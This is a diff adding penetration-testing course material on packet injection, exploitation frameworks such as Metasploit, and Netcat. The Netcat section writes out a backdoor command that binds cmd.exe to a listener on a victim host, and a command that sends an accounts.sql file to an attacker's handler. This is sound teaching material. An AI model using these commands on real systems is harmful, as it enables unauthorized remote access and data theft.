@@ -180,3 +180,63 @@ Wireshark output of a packet analysis. (Screenshot used with permission from wir
 Another useful option is to use the **Follow TCP Stream** context command to reconstruct the packet contents for a TCP session.
 
 The PCAP file format has some limitations, which has led to the development of PCAP Next Generation (PCAPNG). Wireshark now uses PCAPNG by default, and tcpdump can process files in the new format too ([cloudshark.io/articles/5-reasons-to-move-to-pcapng](https://cloudshark.io/articles/5-reasons-to-move-to-pcapng/)).
+## PACKET INJECTION AND REPLAY
+
+Some reconnaissance techniques and tests depend on sending forged or spoofed network traffic. Often, network sniffing software libraries allow frames to be inserted (or injected) into the network stream. There are also tools that allow for different kinds of packets to be crafted and manipulated. Well-known tools used for packet injection include Dsniff ([monkey.org/~dugsong/dsniff](https://monkey.org/~dugsong/dsniff/)), Ettercap ([ettercap-project.org](https://www.ettercap-project.org/)), Scapy ([scapy.net](https://scapy.net/)), and hping ([hping.org](http://hping.org/)).
+
+### hping 
+
+hping is an open-source spoofing tool that provides a penetration tester with the ability to craft network packets to exploit vulnerable firewalls and IDSs. hping can perform the following types of test:
+
+-   Host/port detection and firewall testing—like Nmap, hping can be used to probe IP addresses and TCP/UDP ports for responses.
+-   Traceroute—if ICMP is blocked on a local network, hping offers alternative ways of mapping out network routes. hping can use arbitrary packet formats, such as probing DNS ports using TCP or UDP, to perform traces.
+-   Denial of service (DoS)—hping can be used to perform flood-based DoS attacks from randomized source IPs. This can be used in a test environment to determine how well a firewall, IDS, or load balancer responds to such attacks.
+
+### tcpreplay
+
+As the name suggests, tcpreplay takes previously captured traffic that has been saved to a .pcap file and replays it through a network interface ([linux.die.net/man/1/tcpreplay](https://linux.die.net/man/1/tcpreplay)). Optionally, fields in the capture can be changed, such as substituting MAC or IP addresses. tcpreplay is useful for analysis purposes. If you have captured suspect traffic, you can replay it through a monitored network interface to test intrusion detection rules.
+## EXPLOITATION FRAMEWORKS
+
+A remote access trojan (RAT) is malware that gives an adversary the means of remotely accessing the network. From the perspective of security posture assessment, a penetration tester might want to try to establish this sort of connection and attempt to send corporate information over the channel (data exfiltration). If security controls are working properly, this attempt should be defeated (or at least detected). 
+
+An exploitation framework uses the vulnerabilities identified by an automated scanner and launches scripts or software to attempt to deliver matching exploits. This might involve considerable disruption to the target, including service failure, and risk data security.
+
+The framework comprises a database of exploit code, each targeting a particular CVE (Common Vulnerabilities and Exposures). The exploit code can be coupled with modular payloads. Depending on the access obtained via the exploit, the payload code may be used to open a command shell, create a user, install software, and so on. The custom exploit module can then be injected into the target system. The framework may also be able to obfuscate the code so that it can be injected past an intrusion detection system or antivirus software.
+
+The best-known exploit framework is Metasploit ([metasploit.com](https://www.metasploit.com/)). The platform is open-source software, now maintained by Rapid7. There is a free framework (command line) community edition with installation packages for Linux and Windows. Rapid7 produces pro and express commercial editions of the framework and it can be closely integrated with the Nexpose vulnerability scanner.
+
+![Text includes "Easy phishing: Set up email templates, landing pages and listeners in Metasploit Pro… 1611 exploits… 471 payloads… Free...trial..."](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/3058-1599771795118.png)
+
+Metasploit Framework Console. (Screenshot used with permission from [metasploit.com](https://www.metasploit.com/).)
+
+Sn1per ([github.com/1N3/Sn1per](https://github.com/1N3/Sn1per)) is a framework designed for penetration test reporting and evidence gathering. It can integrate with other tools such as Metasploit and Nikto to run automated suites of tests. Results can be displayed as web reports. 
+
+There are many other exploitation frameworks targeting different kinds of vulnerabilities. Some examples include:
+
+-   fireELF—injecting fileless exploit payloads into a Linux host ([github.com/rek7/fireELF](https://github.com/rek7/fireELF)).
+-   RouterSploit—vulnerability scanning and exploit modules targeting embedded systems ([github.com/threat9/routersploit](https://github.com/threat9/routersploit)).
+-   Browser Exploitation Framework (BeEF)—recovering web session information and exploiting client-side scripting ([beefproject.com](https://beefproject.com/)).
+-   Zed Attack Proxy (ZAP)—scanning tools and scripts for web application and mobile app security testing ([owasp.org/www-project-zap](https://owasp.org/www-project-zap/)).
+-   Pacu—scanning and exploit tools for reconnaissance and exploitation of Amazon Web Service (AWS) accounts ([rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework](https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/)).
+
+## NETCAT
+
+One simple but effective tool for testing connectivity is Netcat (nc), available for both Windows and Linux. Netcat is a computer networking utility for reading and writing raw data over a network connection, and can be used for port scanning and fingerprinting. For example, the following command attempts to connect to the HTTP port on a server and return any banner by sending the "head" HTTP keyword:
+
+echo "head" | nc 10.1.0.1 -v 80
+
+Netcat can also establish connections with remote machines. To configure Netcat as a backdoor, you first set up a listener on the victim system (IP: 10.1.0.1) set to pipe traffic from a program, such as the command interpreter, to its handler:
+
+nc -l -p 666 -e cmd.exe
+
+The following command connects to the listener and grants access to the terminal:
+
+nc 10.1.0.1 666
+
+Used the other way around, Netcat can be used to receive files. For example, on the target system the attacker runs the following:
+
+type accounts.sql | nc 10.1.0.192 6666
+
+On the handler (IP 10.1.0.192), the attacker receives the file using the following command:
+
+nc -l -p 6666 > accounts.sql
